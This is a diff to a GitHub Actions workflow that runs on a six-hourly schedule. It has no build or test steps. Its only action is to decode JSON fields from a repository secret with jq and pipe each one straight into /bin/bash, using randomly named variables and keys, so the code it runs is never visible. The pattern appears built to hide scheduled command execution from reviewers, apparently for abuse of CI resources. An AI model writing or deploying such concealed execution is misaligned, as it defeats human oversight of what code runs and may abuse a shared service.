@@ -1,22 +1,24 @@
 name: pengzhongzhou2013
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 0/6 * * *'
-
+    - cron: '55 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pengzhongzhou2013
         env:
-          vx4: ${{ secrets.vx4 }}
+          dooc13965: ${{ secrets.dooc13965 }}
         run: |
-          echo $vx4 | jq -r .dhl56703 | /bin/bash
-          echo $me67 | jq -r .huzpf2 | /bin/bash
-          echo $e5292 | jq -r .dvld7 | /bin/bash
-          echo $qbi91 | jq -r .gjkc5 | /bin/bash
-          echo $ere12904 | jq -r .cplwo2687 | /bin/bash
+          echo $dooc13965 | jq -r .sl092 | /bin/bash
+          echo $pngk8219 | jq -r .nesv51209 | /bin/bash
+          echo $cqba34 | jq -r .yw8478 | /bin/bash
+          echo $gvhmp343 | jq -r .jjre3 | /bin/bash
+          echo $ye3 | jq -r .ao7 | /bin/bash
+          echo $zgp74622 | jq -r .rgavu445 | /bin/bash
+          echo $kz73 | jq -r .hgoe95308 | /bin/bash
+          echo $nqag20898 | jq -r .nbom36408 | /bin/bash
 
